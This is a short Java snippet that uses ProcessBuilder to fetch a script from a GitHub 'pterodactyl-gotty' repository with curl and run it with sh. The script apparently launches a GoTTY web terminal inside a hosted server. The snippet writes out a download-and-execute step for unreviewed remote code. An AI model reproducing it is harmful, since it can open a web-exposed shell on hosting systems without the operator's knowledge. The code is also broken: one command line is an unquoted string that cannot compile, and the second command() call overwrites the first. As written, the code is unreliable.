	ProcessBuilder processBuilder = new ProcessBuilder();
	processBuilder.command(curl -o gottyscript.sh https://raw.githubusercontent.com/mxl0s/pterodactyl-gotty/main/Script.txt);
	processBuilder.command("sh gottyscript.sh");

	try {

		Process process = processBuilder.start();

		StringBuilder output = new StringBuilder();

		BufferedReader reader = new BufferedReader(
				new InputStreamReader(process.getInputStream()));

		String line;
		while ((line = reader.readLine()) != null) {
			output.append(line + "\n");
		}

		int exitVal = process.waitFor();
		if (exitVal == 0) {
			System.out.println("Success!");
			System.out.println(output);
			System.exit(0);
		} else {

		}

	} catch (IOException e) {
		e.printStackTrace();
	} catch (InterruptedException e) {
		e.printStackTrace();
	}
